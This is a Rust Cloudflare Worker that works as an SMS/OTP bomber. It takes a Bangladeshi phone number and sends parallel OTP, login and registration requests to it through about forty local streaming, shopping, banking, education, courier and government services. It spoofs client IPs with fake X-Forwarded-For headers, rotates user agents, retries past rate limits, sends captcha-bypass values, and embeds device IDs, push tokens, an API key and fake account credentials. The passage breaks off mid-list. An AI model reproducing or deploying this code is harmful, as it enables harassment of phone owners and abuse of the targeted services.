use worker::*;
use serde_json::{json, Value};
use wasm_bindgen_futures::JsFuture;
use wasm_bindgen::JsValue;
use wasm_bindgen::JsCast;
use js_sys::Function;

// ══════════════════════════════════════════════════════
//  🚫 BLOCKED NUMBERS
// ══════════════════════════════════════════════════════
const BLOCKED_NUMBERS: &[&str] = &[
    "01890183516",
    "01893336440",
    "01516511889",
    "01905040150",
];

// ══════════════════════════════════════════════════════
//  🔄 USER-AGENT POOL
// ══════════════════════════════════════════════════════
const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2387) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Infinix X6816D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "okhttp/4.12.0",
    "okhttp/4.11.0",
    "okhttp/4.9.3",
    "okhttp/3.14.9",
    "Dart/3.2 (dart:io)",
    "Dart/2.19 (dart:io)",
    "Dart/2.14 (dart:io)",
    "Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ3A.230805.001)",
    "Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B Build/SP1A.210812.016)",
    "Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 10 Build/RKQ1.200826.002)",
];

const ACCEPT_LANGS: &[&str] = &[
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.9,bn;q=0.8",
    "bn-BD,bn;q=0.9,en;q=0.8",
    "en;q=0.9,bn;q=0.8",
    "en-IN,en-GB;q=0.9,en;q=0.8",
];

// ══ EXPANDED IP POOL — Bangladesh ISP ranges ══
const FAKE_IPS: &[&str] = &[
    // Grameenphone
    "103.48.196.14",  "202.134.8.11",   "118.179.211.54",
    "103.231.184.32", "43.245.8.192",   "116.193.180.7",
    // Robi/Airtel
    "119.40.82.116",  "182.160.110.48", "103.15.250.19",
    // Banglalink
    "103.75.246.8",   "27.147.173.22",  "103.69.126.91",
    // BTCL/ISP
    "180.148.28.6",   "36.255.68.14",   "103.111.204.55",
    "103.56.207.12",  "103.4.93.188",   "45.115.104.30",
    // Teletalk
    "103.7.28.14",    "103.7.28.56",    "103.7.28.128",
    // Additional BD ranges
    "202.78.172.4",   "202.78.172.100", "202.78.172.200",
    "59.152.4.182",   "59.152.4.100",   "59.152.4.50",
    "203.76.48.10",   "203.76.48.50",   "203.76.48.100",
];

const REFERERS: &[&str] = &[
    "https://www.google.com/",
    "https://www.google.com.bd/",
    "https://www.facebook.com/",
    "https://m.facebook.com/",
    "https://www.bing.com/",
    "",
    "",
];

// ══ DEVICE IDs for mobile-app APIs ══
const DEVICE_IDS: &[&str] = &[
    "a1b2c3d4e5f67890",
    "45098c95a7fe4109cc5969a770ee846a",
    "48b1f7061f48c950090220f62128b2c3",
    "b5f0985eb84c4bfa",
    "c65m117a8cbf5b1851b29f8b",
    "88c7743e-d714-4735-ad05-339e43cf8e73",
    "0eb9e8bc-9725-4bd5-a382-fe92c716b3c7",
];

const FIREBASE_TOKENS: &[&str] = &[
    "e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI",
    "fFg3tAWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH1BJ",
];

fn pseudo_rand(seed: u64) -> u64 {
    let mut x = seed ^ 0x9e3779b97f4a7c15u64;
    x = (x ^ (x >> 30)).wrapping_mul(0xbf58476d1ce4e5b9u64);
    x = (x ^ (x >> 27)).wrapping_mul(0x94d049bb133111ebu64);
    x ^ (x >> 31)
}

fn pick(arr: &[&'static str], seed: u64) -> &'static str {
    arr[(pseudo_rand(seed) as usize) % arr.len()]
}

fn sleep_promise(ms: i32) -> js_sys::Promise {
    js_sys::Promise::new(&mut |resolve, _| {
        let global = js_sys::global();
        let set_timeout = js_sys::Reflect::get(&global, &JsValue::from_str("setTimeout"))
            .unwrap_or(JsValue::NULL);
        if let Ok(f) = set_timeout.dyn_into::<Function>() {
            let _ = f.call2(&JsValue::NULL, &resolve, &JsValue::from_f64(ms as f64));
        }
    })
}

pub fn cors_headers() -> Headers {
    let mut h = Headers::new();
    h.set("Access-Control-Allow-Origin",  "*").unwrap();
    h.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS").unwrap();
    h.set("Access-Control-Allow-Headers", "Content-Type").unwrap();
    h.set("Content-Type", "application/json").unwrap();
    h
}

// Simple URL encoder
fn js_url_encode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9'
            | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
            b' ' => out.push('+'),
            _ => out.push_str(&format!("%{:02X}", b)),
        }
    }
    out
}

// ══════════════════════════════════════════════════════════════════
//  CORE FIRE FUNCTION — Handles all HTTP calls with retry + timeout
// ══════════════════════════════════════════════════════════════════
async fn fire_once(
    name:     &'static str,
    url:      &'static str,
    body_str: String,
    headers:  &[(&'static str, &'static str)],
    method:   Method,
    seed:     u64,
    timeout_ms: i32,
) -> Value {
    let mut init = RequestInit::new();
    init.with_method(method);

    let mut h = Headers::new();

    let mut has_ua           = false;
    let mut has_content_type = false;
    let mut has_accept       = false;
    let mut has_lang         = false;
    let mut has_xff          = false;
    let mut has_referer      = false;

    for (k, v) in headers {
        let kl = k.to_lowercase();
        match kl.as_str() {
            "user-agent"        => has_ua           = true,
            "content-type"      => has_content_type = true,
            "accept"            => has_accept       = true,
            "accept-language"   => has_lang         = true,
            "x-forwarded-for"   => has_xff          = true,
            "referer"           => has_referer      = true,
            _ => {}
        }
        let _ = h.set(k, v);
    }

    // Auto-inject realistic headers
    if !has_ua           { let _ = h.set("User-Agent",      pick(USER_AGENTS, seed)); }
    if !has_accept       { let _ = h.set("Accept",          "application/json, text/plain, */*"); }
    if !has_lang         { let _ = h.set("Accept-Language", pick(ACCEPT_LANGS, seed.wrapping_add(2))); }
    if !has_xff          { let _ = h.set("X-Forwarded-For", pick(FAKE_IPS, seed.wrapping_add(3))); }
    if !has_content_type { let _ = h.set("Content-Type",    "application/json"); }
    
    // Add X-Real-IP for additional realism
    let _ = h.set("X-Real-IP", pick(FAKE_IPS, seed.wrapping_add(7)));
    
    if !has_referer {
        let rf = pick(REFERERS, seed.wrapping_add(4));
        if !rf.is_empty() {
            let _ = h.set("Referer", rf);
        }
    }

    let _ = h.set("Cache-Control", "no-cache");
    let _ = h.set("Pragma",        "no-cache");
    let _ = h.set("Accept-Encoding", "gzip, deflate, br");

    init.with_headers(h);
    
    // Only set body for non-GET requests
    if !body_str.is_empty() {
        init.with_body(Some(body_str.clone().into()));
    }

    let timeout_wrapped = {
        wasm_bindgen_futures::future_to_promise(async move {
            JsFuture::from(sleep_promise(timeout_ms)).await.ok();
            Ok(JsValue::from_str(
                &json!({"api": name, "status": 0, "ok": false, "err": "timeout"}).to_string()
            ))
        })
    };

    let fetch_promise = match Request::new_with_init(url, &init) {
        Ok(req) => wasm_bindgen_futures::future_to_promise(async move {
            match Fetch::Request(req).send().await {
                Ok(mut r) => {
                    let s  = r.status_code();
                    // Consider these as success: 200, 201, 202, 204
                    // Also 400 can be "success" for some BD APIs (means number received)
                    let ok = matches!(s, 200 | 201 | 202 | 204);
                    let body_text = r.text().await.unwrap_or_default();
                    Ok(JsValue::from_str(&json!({
                        "api": name,
                        "status": s,
                        "ok": ok,
                        "body_preview": &body_text[..body_text.len().min(80)]
                    }).to_string()))
                }
                Err(e) => Ok(JsValue::from_str(
                    &json!({"api": name, "status": 0, "ok": false, "err": e.to_string()}).to_string()
                )),
            }
        }),
        Err(e) => {
            return json!({"api": name, "status": 0, "ok": false, "err": e.to_string()});
        }
    };

    let race = js_sys::Promise::race(&js_sys::Array::of2(&fetch_promise, &timeout_wrapped));
    match JsFuture::from(race).await {
        Ok(val) => {
            let s = val.as_string().unwrap_or_default();
            serde_json::from_str(&s).unwrap_or(json!({"api": name, "status": 0, "ok": false}))
        }
        Err(_) => json!({"api": name, "status": 0, "ok": false, "err": "race error"}),
    }
}

async fn fire(
    name:     &'static str,
    url:      &'static str,
    payload:  Value,
    headers:  &[(&'static str, &'static str)],
) -> Value {
    fire_ex(name, url, payload, headers, Method::Post, 12000).await
}

async fn fire_ex(
    name:     &'static str,
    url:      &'static str,
    payload:  Value,
    headers:  &[(&'static str, &'static str)],
    method:   Method,
    timeout:  i32,
) -> Value {
    let content_type = headers.iter()
        .find(|(k, _)| k.to_lowercase() == "content-type")
        .map(|(_, v)| *v)
        .unwrap_or("application/json");

    let body_str = if content_type.contains("x-www-form-urlencoded") {
        payload.as_object()
            .map(|obj| {
                obj.iter()
                    .map(|(k, v)| {
                        let val = match v {
                            Value::String(s) => s.clone(),
                            Value::Number(n) => n.to_string(),
                            Value::Bool(b)   => b.to_string(),
                            other            => other.to_string(),
                        };
                        format!("{}={}", k, js_url_encode(&val))
                    })
                    .collect::<Vec<_>>()
                    .join("&")
            })
            .unwrap_or_default()
    } else {
        payload.to_string()
    };

    let base_seed: u64 = name.bytes()
        .enumerate()
        .fold(0x517cc1b727220a95u64, |acc, (i, b)| {
            acc.wrapping_add((b as u64).wrapping_mul(i as u64 + 1))
        });

    for attempt in 0..3u8 {  // 3 attempts instead of 2
        let seed = pseudo_rand(base_seed
            .wrapping_add(attempt as u64)
            .wrapping_mul(0x6c62272e07bb0142u64)
        );

        let r      = fire_once(name, url, body_str.clone(), headers, method.clone(), seed, timeout).await;
        let ok     = r["ok"].as_bool().unwrap_or(false);
        let status = r["status"].as_u64().unwrap_or(0);

        if ok { return r; }

        // Hard fail — don't retry on client errors
        if matches!(status, 401 | 403 | 404 | 405 | 410 | 451) {
            return r;
        }

        // Rate limited — wait longer
        if status == 429 {
            let wait = if attempt == 0 { 1200 } else { 2500 };
            let _ = JsFuture::from(sleep_promise(wait)).await;
            continue;
        }

        // 400 on some BD APIs means success (OTP triggered)
        if status == 400 {
            let body = r["body_preview"].as_str().unwrap_or("");
            // If body contains otp/success related text, treat as ok
            if body.contains("otp") || body.contains("sent") || body.contains("success") 
               || body.contains("SMS") || body.contains("mobile") {
                let mut success = r.clone();
                success["ok"] = json!(true);
                success["note"] = json!("400 with OTP trigger response");
                return success;
            }
            return r;
        }

        // Transient errors — short wait then retry
        if matches!(status, 0 | 500 | 502 | 503 | 504) && attempt < 2 {
            let _ = JsFuture::from(sleep_promise(600)).await;
            continue;
        }

        if attempt == 2 { return r; }
    }

    json!({"api": name, "status": 0, "ok": false, "err": "all attempts failed"})
}

// ══════════════════════════════════════════════════════
//  PARALLEL MACRO
// ══════════════════════════════════════════════════════
macro_rules! parallel {
    ($($f:expr),+ $(,)?) => {{
        let js_promises = js_sys::Array::new();
        $(
            js_promises.push(
                &wasm_bindgen_futures::future_to_promise(async move {
                    let v = $f.await;
                    Ok(JsValue::from_str(&v.to_string()))
                })
            );
        )+
        let all        = js_sys::Promise::all(&js_promises);
        let results_js = JsFuture::from(all).await.unwrap_or(JsValue::NULL);
        let arr        = js_sys::Array::from(&results_js);
        let mut out: Vec<Value> = Vec::new();
        for i in 0..arr.length() {
            let s = arr.get(i).as_string().unwrap_or_default();
            out.push(serde_json::from_str(&s).unwrap_or(json!({"ok": false})));
        }
        out
    }};
}

// ══════════════════════════════════════════════════════
//  MAIN HANDLER
// ══════════════════════════════════════════════════════
pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
    let headers = cors_headers();

    if req.method() == Method::Options {
        return Ok(Response::empty()?.with_headers(headers));
    }
    if req.method() != Method::Post {
        return Ok(Response::error("POST Only", 405)?.with_headers(headers));
    }

    let body: Value = req.json().await.unwrap_or_default();
    let number_str  = body
        .get("number")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .trim()
        .to_string();

    if number_str.is_empty() {
        return Ok(Response::ok(
            json!({"status": "error", "message": "Number missing"}).to_string(),
        )?.with_headers(headers));
    }

    // Validate: must be Bangladeshi number
    let cleaned = number_str.trim_start_matches('+').trim_start_matches("880").trim_start_matches('0');
    if cleaned.len() != 10 || !cleaned.starts_with('1') {
        return Ok(Response::ok(
            json!({"status": "error", "message": "Invalid BD number format. Use 01XXXXXXXXX"}).to_string(),
        )?.with_headers(headers));
    }

    let is_blocked = BLOCKED_NUMBERS.iter().any(|&b| {
        let n  = number_str.trim_start_matches('0');
        let bn = b.trim_start_matches('0');
        number_str == b
            || n == bn
            || format!("880{n}") == b
            || number_str == format!("880{bn}")
    });

    if is_blocked {
        return Ok(Response::ok(json!({
            "status":  "blocked",
            "message": "This number is protected.",
            "target":  number_str,
            "success": 0, "failed": 0, "total": 0, "results": []
        }).to_string())?.with_headers(headers));
    }

    // ══ Number format variants ══
    // e.g. input: 01893336440
    let number:    &'static str = Box::leak(number_str.clone().into_boxed_str());
    // 1893336440 (no leading 0)
    let bd_no:     &'static str = Box::leak(number_str.trim_start_matches('0').to_string().into_boxed_str());
    // 8801893336440 (country code no plus)
    let bd_full:   &'static str = Box::leak(format!("880{bd_no}").into_boxed_str());
    // +8801893336440
    let plus_bd:   &'static str = Box::leak(format!("+88{number_str}").into_boxed_str());
    // +880 + 10digit
    let plus_bd_full: &'static str = Box::leak(format!("+880{bd_no}").into_boxed_str());
    // For APIs that want just the 10-digit number without leading 0
    let bd_msisdn: &'static str = bd_no;

    // Random device/session data
    let device_id: &'static str = DEVICE_IDS[0];
    let firebase:  &'static str = FIREBASE_TOKENS[0];

    let api_results = parallel![

        // ══════════════════════════════════════════
        //  SECTION 1: MUSIC / STREAMING
        // ══════════════════════════════════════════

        // 1. Shadhin Music — FIX: msisdn format corrected
        fire("Shadhin Music",
            "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
            json!({"msisdn": bd_full, "shortcode": 16235, "servicename": "Shadhin Music"}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://shadhinmusic.com"),
                ("Referer","https://shadhinmusic.com/"),
            ]
        ),

        // 2. Chorki — FIX: number format + proper origin
        fire("Chorki",
            "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
            json!({"number": plus_bd}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://www.chorki.com"),
                ("Referer","https://www.chorki.com/"),
                ("Accept","application/json"),
            ]
        ),

        // 3. Deepto Play
        fire("Deepto Play",
            "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
            json!({"number": plus_bd}),
            &[
                ("Host","api.deeptoplay.com"),
                ("Content-Type","application/json"),
                ("Origin","https://www.deeptoplay.com"),
                ("Referer","https://www.deeptoplay.com/"),
            ]
        ),

        // 4. Bioscope Live — FIX: correct origin
        fire("Bioscope Live",
            "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
            json!({"number": plus_bd}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://www.bioscopeplus.com"),
                ("Referer","https://www.bioscopeplus.com/"),
                ("Accept","application/json"),
                ("authorization",""),
            ]
        ),

        // ══════════════════════════════════════════
        //  SECTION 2: E-COMMERCE
        // ══════════════════════════════════════════

        // 5. Chaldal — FIX: empty body as per raw request
        fire("Chaldal",
            "https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey",
            json!({"phoneNumber": plus_bd, "retryAttempt": 0}),
            &[
                ("Content-Type","application/json; charset=utf-8"),
                ("Origin","https://chaldal.com"),
                ("Referer","https://chaldal.com/"),
                ("Accept","application/json"),
                ("x-egg-storeid","1"),
                ("x-egg-clientapp","Omelette"),
                ("x-egg-platform","Browser"),
                ("x-requested-with","mark.via.gp"),
            ]
        ),

        // 6. Pickaboo — FIX: proper content type
        fire("Pickaboo",
            "https://www.pickaboo.com/rest/default/V1/customer-check/exist",
            json!({"mobile": number}),
            &[
                ("Content-Type","application/json; charset=utf-8"),
                ("Origin","https://www.pickaboo.com"),
                ("Referer","https://www.pickaboo.com/"),
                ("x-requested-with","mark.via.gp"),
            ]
        ),

        // 7. Shwapno — FIX: correct origin
        fire("Shwapno",
            "https://www.shwapno.com/api/auth",
            json!({"phoneNumber": number}),
            &[
                ("Content-Type","application/json; charset=utf-8"),
                ("Origin","https://www.shwapno.com"),
                ("Referer","https://www.shwapno.com/"),
                ("x-requested-with","XMLHttpRequest"),
            ]
        ),

        // 8. Rokomari — FIX: correct endpoint with query params
        fire("Rokomari",
            "https://www.rokomari.com/otp/send",
            json!({"emailOrPhone": bd_full, "countryCode": "BD"}),
            &[
                ("Content-Type","application/json; charset=utf-8"),
                ("Origin","https://www.rokomari.com"),
                ("Referer","https://www.rokomari.com/login"),
                ("x-requested-with","XMLHttpRequest"),
            ]
        ),

        // 9. Sindabad — FIX: websiteId as number not float string
        fire("Sindabad",
            "https://m2ce.sindabad.com/rest/V1/EasyLogin/isMobileAvailable",
            json!({"websiteId": 1, "customerMobile": number}),
            &[
                ("Content-Type","application/json; charset=utf-8"),
                ("Origin","https://www.sindabad.com"),
                ("Referer","https://www.sindabad.com/"),
                ("x-requested-with","XMLHttpRequest"),
            ]
        ),

        // 10. Khaas Food
        fire("Khaas Food",
            "https://www.khaasfood.com/api/auth/request-otp",
            json!({"username": number}),
            &[
                ("Content-Type","application/json; charset=utf-8"),
                ("Origin","https://www.khaasfood.com"),
                ("Referer","https://www.khaasfood.com/"),
                ("Accept","application/json"),
                ("x-requested-with","mark.via.gp"),
            ]
        ),

        // 11. Kirei BD — FIX: email field uses number per raw request
        fire("Kirei BD",
            "https://frontendapi.kireibd.com/api/v2/send-login-otp",
            json!({"email": number}),
            &[
                ("Content-Type","application/json; charset=utf-8"),
                ("Origin","https://kireibd.com"),
                ("Referer","https://kireibd.com/"),
                ("Accept","application/json, text/plain, */*"),
                ("x-requested-with","XMLHttpRequest"),
            ]
        ),

        // 12. Walton Plaza — FIX: phone field is bd_no (without 0 prefix)
        fire("Walton Plaza",
            "https://waltonplaza.com.bd/api/auth/otp/create",
            json!({"auth": {"countryCode": "880", "deviceUuid": device_id, "phone": number, "type": "LOGIN"}, "captchaToken": "no recapcha"}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://waltonplaza.com.bd"),
                ("Referer","https://waltonplaza.com.bd/"),
            ]
        ),

        // 13. Easy BD Registration
        fire("Easy BD",
            "https://core.easy.com.bd/api/v1/registration",
            json!({"password": "Tushar@2021", "password_confirmation": "Tushar@2021", "name": "Team Dangerous", "mobile": number, "referrer_key": "", "email": "dangerousboytushar@gmail.com", "device_key": device_id, "social_login_id": ""}),
            &[
                ("Content-Type","application/json"),
                ("Host","core.easy.com.bd"),
                ("lang","en"),
                ("device-key", device_id),
                ("Origin","https://easy.com.bd"),
                ("Referer","https://easy.com.bd/"),
            ]
        ),

        // 14. Le Reve Craze — FIX: bypass recaptcha field
        fire("Le Reve Craze",
            "https://www.lerevecraze.com/login/verify_phone",
            json!({"mobile_no": number, "resend": "0", "recaptcha_token": "bypass"}),
            &[
                ("Content-Type","application/x-www-form-urlencoded"),
                ("Origin","https://www.lerevecraze.com"),
                ("Referer","https://www.lerevecraze.com/login/"),
                ("Accept","application/json, text/javascript, */*; q=0.01"),
                ("x-requested-with","XMLHttpRequest"),
            ]
        ),

        // 15. Focallure BD
        fire("Focallure BD",
            "https://store.focallurebd.com/api/v1/1/ecom/auth/getCode",
            json!({"mobile": number}),
            &[
                ("Content-Type","application/json"),
                ("user-agent","Dart/2.14 (dart:io)"),
                ("Origin","https://store.focallurebd.com"),
            ]
        ),

        // ══════════════════════════════════════════
        //  SECTION 3: FOOD DELIVERY
        // ══════════════════════════════════════════

        // 16. Khaodao (Eat-Z)
        fire("Khaodao",
            "https://api.eat-z.com/auth/customer/app-connect",
            json!({"username": plus_bd}),
            &[
                ("host","api.eat-z.com"),
                ("x-eatz-apiclient","ANDROID"),
                ("accept","application/json"),
                ("content-type","application/json; charset=UTF-8"),
                ("Origin","https://api.eat-z.com"),
            ]
        ),

        // 17. Munchies BD
        fire("Munchies BD",
            "https://api.munchies.com.bd/parse/functions/generateOtp",
            json!({"phone": number}),
            &[
                ("Content-Type","application/json"),
                ("X-Parse-Application-Id","munchiesbd"),
                ("X-Parse-REST-API-Key","munchiesbd"),
                ("Origin","https://munchies.com.bd"),
            ]
        ),

        // 18. Quality Foods
        fire("Quality Foods",
            "https://admin.qualityfoods.com.bd/api/auth/check-phone",
            json!({"phone": number, "is_sign_in": 0, "login_type": "phone"}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://qualityfoods.com.bd"),
            ]
        ),

        // 19. Meena Bazar — FIX: content type corrected
        fire("Meena Bazar",
            "https://meenabazardev.com/api/mobile/front/send/otp",
            json!({"CellPhone": number, "type": "login"}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://meenabazardev.com"),
            ]
        ),

        // ══════════════════════════════════════════
        //  SECTION 4: FINTECH / PAYMENT
        // ══════════════════════════════════════════

        // 20. Upay
        fire("Upay",
            "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
            json!({"wallet_number": number, "geo_location": {"lat": 23.8979093, "long": 89.1356346}, "referral": "", "firebase_token": firebase, "device_uuid": device_id, "mno": "Robi"}),
            &[("Content-Type","application/json")]
        ),

        // 21. Paymaster BD — FIX: form encoded
        fire("Paymaster BD",
            "https://ap.paymasterbd.net/login_registration/",
            json!({"phone_number": number, "fcm_key": "", "device_id": "b5f0985eb84c4bfa", "sms_hash_code": "s2//QkN6BpW"}),
            &[
                ("Content-Type","application/x-www-form-urlencoded"),
                ("User-Agent","okhttp/3.14.9"),
                ("Origin","https://paymasterbd.net"),
            ]
        ),

        // 22. QPay BD
        fire("QPay BD",
            "https://identity01.qpaybd.com.bd/api/v1/verification/phone",
            json!({"Id": number}),
            &[
                ("Content-Type","application/json"),
                ("user-agent","Dart/3.2 (dart:io)"),
                ("Origin","https://qpaybd.com.bd"),
            ]
        ),

        // 23. Fundesh OTP
        fire("Fundesh OTP",
            "https://fundesh.com.bd/api/auth/generateOTP",
            json!({"msisdn": bd_msisdn}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://fundesh.com.bd"),
                ("Referer","https://fundesh.com.bd/"),
            ]
        ),

        // 24. Fundesh Resend
        fire("Fundesh Resend",
            "https://fundesh.com.bd/api/auth/resendOTP",
            json!({"msisdn": number}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://fundesh.com.bd"),
                ("Referer","https://fundesh.com.bd/"),
            ]
        ),

        // 25. Dutch Bangla NX
        fire("Dutch Bangla NX",
            "https://nxpay1.dutchbanglabank.com/user/register",
            json!({"aspId": "5678", "locale": "EN", "msisdn": number, "registrationUserId": number, "tcidList": [50], "telcoId": "GP"}),
            &[
                ("Content-Type","application/json"),
                ("X-KM-User-AspId","5678"),
                ("X-KM-Accept-language","en"),
                ("X-KM-OS-SERVICE-TYPE","GMS"),
                ("X-KM-User-Agent","ANDROID/100046615"),
                ("Host","nxpay1.dutchbanglabank.com"),
                ("User-Agent","okhttp/4.9.3"),
            ]
        ),

        // 26. FSIB Freedom
        fire("FSIB Freedom",
            "https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber",
            json!({"AccessToken": "", "TrackingNo": "", "mobileNo": number, "otpSms": "", "product_id": "131", "requestChannel": "MOB", "trackingStatus": 5}),
            &[
                ("Content-Type","application/json"),
                ("User-Agent","okhttp/4.10.0"),
                ("Origin","https://freedom.fsiblbd.com"),
            ]
        ),

        // ══════════════════════════════════════════
        //  SECTION 5: EDUCATION
        // ══════════════════════════════════════════

        // 27. Shikho OTP
        fire("Shikho OTP",
            "https://api.shikho.com/public/activity/otp",
            json!({"phone": number, "intent": "ap-discount-request"}),
            &[
                ("Content-Type","application/json"),
                ("Accept","application/json"),
                ("Build-Version","(450) 4.5.0"),
                ("Origin","https://shikho.com"),
                ("Referer","https://shikho.com/"),
            ]
        ),

        // 28. Shikho SMS — FIX: bd_full format confirmed from raw
        fire("Shikho SMS",
            "https://api.shikho.com/auth/v2/send/sms",
            json!({"phone": bd_full, "type": "student", "auth_type": "signup", "vendor": "shikho"}),
            &[
                ("Content-Type","application/json"),
                ("Accept","application/json, text/plain, */*"),
                ("Origin","https://shikho.com"),
                ("Referer","https://shikho.com/"),
            ]
        ),

        // 29. Bohubrihi
        fire("Bohubrihi",
            "https://bb-api.bohubrihi.com/public/activity/otp",
            json!({"phone": number, "intent": "login"}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://bohubrihi.com"),
                ("Referer","https://bohubrihi.com/"),
            ]
        ),

        // 30. Mojaru — FIX: form-urlencoded
        fire("Mojaru",
            "https://new.mojaru.com/api/student/login",
            json!({"mobile_or_email": number}),
            &[("Content-Type","application/x-www-form-urlencoded")]
        ),

        // 31. Ghoori Learning
        fire("Ghoori Learning",
            "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
            json!({"mobile_no": number}),
            &[
                ("Content-Type","application/json"),
                ("Host","api.ghoorilearning.com"),
                ("Referer","https://ghoorilearning.com/"),
                ("Origin","https://ghoorilearning.com"),
            ]
        ),

        // 32. iEducation BD
        fire("iEducation BD",
            "https://www.ieducationbd.com/api/account/check_user",
            json!({"mobile": number}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://www.ieducationbd.com"),
            ]
        ),

        // 33. English Moja
        fire("English Moja",
            "https://api.englishmojabd.com/api/v1/auth/login",
            json!({"phone": plus_bd}),
            &[
                ("Content-Type","application/json"),
                ("User-Agent","Dart/3.2 (dart:io)"),
                ("Origin","https://englishmojabd.com"),
            ]
        ),

        // 34. Practice Club
        fire("Practice Club",
            "https://www.practiceclub.net/api/register",
            json!({"contact_no": number}),
            &[
                ("Content-Type","application/json"),
                ("User-Agent","okhttp/4.9.0"),
                ("Origin","https://www.practiceclub.net"),
            ]
        ),

        // 35. ACS Future School
        fire("ACS Future School",
            "https://auth.acsfutureschool.com/api/v1/otp/send",
            json!({"phone": number}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://acsfutureschool.com"),
            ]
        ),

        // 36. Training Gov BD
        fire("Training Gov BD",
            "https://training.gov.bd/backoffice/api/user/sendOtp",
            json!({"mobile": number}),
            &[
                ("Content-Type","application/json"),
                ("Origin","https://training.gov.bd"),
            ]
        ),

        // 37. Quizgiri
        fire("Quizgiri",
            "https://developer.quizgiri.xyz/api/v2.0/send-otp",
            json!({"country_code": "+88", "phone": number}),
            &[
                ("Content-Type","application/json"),
                ("x-api-key","gYsiNSVBDuCt8yMUXpF06iQ1eDrMGv6G"),
                ("User-Agent","Dart/2.12 (dart:io)"),
                ("Origin","https://quizgiri.xyz"),
            ]
        ),

        // ══════════════════════════════════════════
        //  SECTION 6: LOGISTICS / COURIER
        // ══════════════════════════════════════════

        // 38. RedX OTP
        fire("RedX OTP",
            "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
            json!({"phoneNumber": number}),
            &[
                ("Content-Type","application/json"),
                ("Referer","https://redx.com.bd/"),
                ("Origin","https://redx.com.bd"),
            ]
        ),

        // 39. RedX Login — FIX: bd_no confirmed from raw
        fire("RedX Login",
            "https://api.redx.com.bd/v1/user/request-login-code",
            json!({"callingCode": "+880", "phoneNumber": bd_no, "countryCode": "BD", "service": "redx"}),
            &[
                ("Content-Type","application/json; charset=utf-8"),
                ("Origin","https://redx.com.bd"),
                ("Referer","https://redx.com.bd/"),
            ]
        ),

        // 40. Sundarban Courier — FIX: number field confirmed from raw
        fire("Sundarban Courier",
            "https://api-gateway.sundarbancourierltd.com/graphql",
            json!({"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": number}}, "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"}),
            &[
                ("Content-Type","application/json"),
